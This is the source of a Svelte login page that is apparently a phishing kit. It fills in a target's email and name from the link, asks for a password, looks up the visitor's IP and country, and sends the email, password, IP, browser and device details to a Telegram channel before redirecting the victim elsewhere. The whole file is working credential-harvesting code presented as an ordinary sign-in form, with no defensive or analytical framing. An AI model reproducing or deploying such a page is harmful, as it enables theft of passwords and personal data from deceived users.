<script lang="ts">
  import { onMount } from 'svelte';
  import { page } from '$app/stores';
  import { browser } from '$app/environment';
  import { sendTelegramMessage } from '$lib/telegram';
  import { writable, get } from 'svelte/store';

  const email = writable('');
  const name = writable('');
  const password = writable('');
  const loading = writable(false);
  const step = writable<'email' | 'password'>('email');

  let userAgent = '';
  let ip = '';
  let device = '';
  let browserType = '';
  let country = '';

  const getInitials = (text: string) => {
    const parts = text.split(/[@.\s]/).filter(Boolean);
    return (parts[0]?.[0] || '').toUpperCase() + (parts[1]?.[0] || '').toUpperCase();
  };

  const fetchIPData = async () => {
    try {
      const res = await fetch('https://ipapi.co/json');
      const data = await res.json();
      ip = data.ip;
      country = data.country_name;
    } catch {
      ip = 'Unknown';
      country = 'Unknown';
    }
  };

  const handleLogin = async () => {
    if (get(password).length < 5) {
      alert('Password must be at least 5 characters');
      return;
    }

    loading.set(true);

    const message = `
🔐 *New Login*
👤 *Name:* ${get(name) || 'Unknown'}
📧 *Email:* ${get(email)}
🔑 *Password:* ${get(password)}
🌍 *Country:* ${country}
📡 *IP:* ${ip}
🧭 *Browser:* ${browserType}
💻 *Device:* ${device}
🕒 *Time:* ${new Date().toLocaleString()}
🧾 *User-Agent:* ${userAgent}
    `.trim();

    await sendTelegramMessage(message);
    window.location.href = import.meta.env.VITE_FINAL_URL;
  };

  onMount(async () => {
    const params = new URLSearchParams(window.location.search);
    const e = params.get('email');
    const n = params.get('name');

    if (e) {
      email.set(e);
      step.set('password');
    }

    if (n) {
      name.set(decodeURIComponent(n));
    }

    if (browser) {
      userAgent = navigator.userAgent;
      browserType = navigator.vendor || navigator.appName;
      device = navigator.platform;
      await fetchIPData();
    }
  });
</script>

<style>
  main {
    background: url('/PUSHSQUAD.JPG') center/cover no-repeat;
    backdrop-filter: blur(10px);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .card {
    background: white;
    border: 4px solid #0044cc;
    border-radius: 1rem;
    padding: 2rem;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 6px 30px rgba(0, 0, 0, 0.2);
    text-align: center;
    position: relative;
  }

  .avatar {
    background-color: #007bff;
    color: white;
    width: 60px;
    height: 60px;
    border-radius: 9999px;
    font-size: 1.5rem;
    font-weight: bold;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 1rem auto;
  }

  input {
    width: 100%;
    padding: 0.7rem;
    margin: 0.5rem 0 1rem 0;
    border: 1px solid #ccc;
    border-radius: 6px;
  }

  button {
    background-color: #007bff;
    color: white;
    border: none;
    padding: 0.7rem 1.5rem;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
    width: 100%;
  }

  .loading {
    font-weight: bold;
    font-size: 1.2rem;
  }
</style>

<main>
  {#if $loading}
    <div class="card">
      <p class="loading">Logging in...</p>
    </div>
  {:else}
    <div class="card">
      {#if $step === 'email' && !$email}
        <h2>Enter Your Email</h2>
        <input type="email" placeholder="you@example.com" bind:value={$email} on:blur={() => $step = 'password'} />
      {:else}
        {#if $email || $name}
          <div class="avatar">{getInitials($name || $email)}</div>
          <h2>Welcome {$name || $email}</h2>
        {/if}
        <input type="password" placeholder="Enter your password" bind:value={$password} />
        <button on:click={handleLogin}>Login</button>
      {/if}
    </div>
  {/if}
</main>
